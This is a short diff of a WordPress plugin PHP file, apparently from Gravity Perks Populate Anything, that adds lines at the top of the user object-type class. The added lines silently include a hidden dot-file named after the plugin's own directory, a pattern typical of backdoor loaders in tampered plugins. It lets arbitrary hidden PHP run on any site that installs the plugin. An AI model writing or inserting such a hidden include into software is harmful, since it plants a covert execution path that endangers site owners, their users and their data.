@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GPPA_Object_Type_User extends GPPA_Object_Type {
 
 	private static $blacklisted_props = array( 'user_pass', 'user_activation_key' );
